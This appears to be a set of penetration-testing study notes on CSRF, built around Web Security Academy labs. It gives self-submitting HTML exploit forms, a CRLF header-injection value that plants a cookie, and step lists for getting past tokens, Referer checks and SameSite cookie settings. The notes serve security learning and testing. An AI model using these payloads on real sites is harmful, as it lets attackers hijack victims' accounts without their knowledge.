![[CSRF.webp]]
# Recon

Identify an application function that can be used to perform some sensitive action on behalf of another user without their knowledge, that relies solely on cookies for tracking user sessions, and that contains request parameters that an attacker can fully determine in advance.

Some examples include:

- changing email address
- changing password
- changing shipping address
- transferring funds

After identification, create an HTML page that performs the request without user interaction:

- For GET requests, place the vulnerable URL inside of an img tag within a src attribute
- For POST requests, create a form that contains all the required parameters and issues a request to the vulnerable URL. JS can be used to automatically submit the form when the page loads.

While you have an authenticated session, you can load the HTML page in the same browser to confirm if the request was processed successfully.
# Example Payloads

You can use the `src` attribute within an `img` tag to craft the CSRF exploit or just use a standalone URL:

```html
<html>
<img src="https://vulnerable-app.com/my-account/change-email?email=TestCSRF@test.com
</html>
```

For POST requests, you need to create a form that contains all the required parameters to submit successfully:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
# No CSRF Protections

If no defence is in place in a state-changing request, an appropriate HTML page can be made that will submit a request to the vulnerable app. 

Payloads for CSRF GET requests can be self contained within a URL - an attacker does not need to host the exploit code in their server. They simply send the link to the victim via social engineering techniques.

Payloads for CSRF POST requests need a form to be created with all the data needed to process the request successfully - an attacker must host this code somewhere and send a link of that malicious site to the victim. Browser automatically adds the authenticated session cookies to the request when clicked.

1. Find a vulnerable state-changing request (i.e. changing email)
2. Generate a CSRF PoC from Burp Pro

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a74000503dc7d74817e9a9100b50027.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;pwned&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

3. Change email address
4. Deliver to the victim
# CSRF Protection Bypass (HTTP Method)

If the app is using a CSRF token in the POST body parameter, change the request method to GET and leave out the token parameter (or modify it but leave it there), potentially bypassing the defence.

>[!info]
>Happens due to frameworks only implementing CSRF protection on state-changing requests, and state-changing requests should only be done with POST methods.

1. Find a vulnerable state-changing request
2. Change request method
3. Generate a CSRF PoC from Burp Pro & remove/modify the token value

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aca002a04b949f58771396f000100cd.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="victim&#64;victim&#46;net" />
      <input type="hidden" name="csrf" value="o1vGcjnkr9Z3HzljhgTHGUGghghdge" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Deliver exploit to victim
# CSRF Protection Bypass (Remove CSRF Parameter)

When the app uses a CSRF token as a header/parameter, remove the entire CSRF token parameter and value to potentially bypass the CSRF protection.

1. Find a vulnerable state-changing request
2. Send the request to Repeater and remove the CSRF token parameter from the request and submit it
3. If request is successful, generate a CSRF PoC from Burp Pro

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6c004d0354f0a281149eb0003f0061.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;victim&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Deliver the exploit to the victim through the exploit server
# CSRF Protection Bypass (Token Not Tied to Session)

CSRF tokens may not be tied to the user's session. The app may be keeping a pool of valid tokens and if the submitted request contains one of these tokens then the request will be processed successfully. 

An attacker can log in to the app, obtain a valid token and use the token when attacking other users via a CSRF attack.

1. Find a vulnerable state changing request.
2. Make a request and take note of the CSRF token value & drop the request (CSRF tokens are one-time use)
3. Generate a CSRF PoC
4. Replace the token value with one copied or not used before

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4b0006038634fb80b6bce700680074.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;wiener3&#46;net" />
      <input type="hidden" name="csrf" value="W6FsHjNLdaj75dIEssPr" /> <!-- Replace -->
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

5. Deliver exploit to victim
# CSRF Protection Bypass (Token Tied to Arbitrary Cookie)

A CSRF token may be tied to an arbitrary cookie. If the app contains some functionality that allows you to set a cookie in the victim's browser, you may be able to bypass it.

The attacker must log into the app, obtain a valid CSRF token and the cookie it is mapped to. Afterwards, they create a crafted CSRF exploit that sets the known cookie in the victim's browser then submits the POST request with the necessary parameters, which include the known CSRF token.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```

1. Find vulnerable state-changing request.
2. Submit a request
3. Play around with the cookies (which one for session, which one for CSRF keys)
4. Change CSRF token value and submit request
5. If CSRF cookie only results in token being rejected, it may not be tied to the session
6. Submit valid CSRF token from another user
7. If invalid token, key/token are tied together
8. Submit valid CSRF token and cookie from another user
9. If successful, it is vulnerable
10. Inject csrfKey cookie in session via header injection (search term gets added as cookie)
	- hat%0d%0aSet-Cookie:%20csrfKey=value
11. Generate CSRF PoC and change CSRF token value
12. Add the following line in replacement of the auto submit `<img src="https://0ac4002e043977048170575f002b006a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=N6C9lRJbvtR4vB7qR86ipkg0GyB71XHy%3b%20SameSite=None" onerror="document.forms[0].submit()">`
13. Deliver to the victim
# CSRF Protection Bypass (Double Submit Cookie Method)

App may be using a double submit cookie for CSRF protection. There may be a CSRF cookie and a CSRF token parameter in the state-changing request. The 2 values can contain the exact same data - the app processes the request successfully if the 2 values are equal.

If the app contains some functionality that allows you to set a cookie in the victim's browser, it may be possible to bypass it by crafting a payload that will set a cookie in the victim's browser and supply the same value as the CSRF token parameter in the HTML form:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="hidden" name="csrf" value="iH07e8eJkWw" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="$cookie-injection-url" onerror="document.forms[0].submit()">
  </body>
</html>
```
# CSRF Protection Bypass (Referer Header Validation Bypass)

If the app is using the Referer header for protection against CSRF, remove the header/value completely and review if the request was processed successfully. If the request was still successful, an HTML form can be crafted that includes some attributes that will cause the browser to drop the "Referer" header with the request:

```html
<html>
    <meta name="referrer" content="never">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

As an example, an app may use the Referer header to defend against CSRF attacks by only checking to see if a specific domain value was somewhere within the Referer header. It can be easily bypassed by submitting a payload that will inject the required domain value as a query parameter in the Referer header:

```html
<html>
    <meta name="referrer" content="unsafe-url">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?REQUIRED-REFERER-VALUE')</script>
    <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test@Test.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
# SameSite Lax Bypass via Method Override

If the app is setting the session cookie with the `SameSite=Lax` configuration, identify all the state changing requests and determine if the request can be sent with a GET request. If GET requests are blocked, you can use method override to bypass restrictions.

Certain frameworks allow it such as Symfony. As an example:

- \_method=POST
- GET /my-account/change-email?email=foo%40web-security-academy.net&\_method=POST HTTP/1

```html
<script>
document.location = "https://0c52008e004f.web-security-academy.net/my-account/change-email?email=test123%40web-security-academy.net&_method=POST";
</script>
```
# SameSite Strict Bypass via Client-Side Redirect

If a cookie is set with the `SameSite=Strict` attribute, browsers wont include it in any cross-site requests. It may be bypassed if you find a gadget that results in a secondary request within the same site. One gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As an example, the app is grabbing the value of the `postId` parameter to initiate a client-side redirect. The directory traversal payload in the beginning was required to reach the webroot when the redirection happens.

```url
https://lab.net/post/comment/confirmation?postId=../my-account/change-email?email=test@test.com
```

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
# SameSite Strict Bypass via Sibling Domain

If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. 

Identify if there are any vulnerabilities in a sibling domain within the same site that enables you to elicit a secondary request, such as an XSS. Using the XSS vector in the sibling domain would allow you to inject the CSRF payload in the request to elicit a same-site request, then the browser would send the session cookies with that CSRF payload request.

>[!info]
>Example for the lab was using the payload to bypass a Cross-Site WebSocket Hijacking (CSWSH) vulnerability as well.
# SameSite Lax Bypass via Cookie Refresh

In Chrome, the default config for SameSite attribute is setting the cookie with Lax 120 seconds after it has been set by the application. It only works when the app does not include the SameSite attribute when setting the cookie.

Since there is a 120 second window where the users are susceptible to cross-site attacks.

The lab demonstrated an example where you can initiate a request that will set a fresh cookie in the user's browser, then submit the CSRF payload, allowing you to submit the CSRF payload always before it reaches the 120 seconds time before the Lax config i set.

The lab combined a functionality used in the OAuth authentication vulnerability section.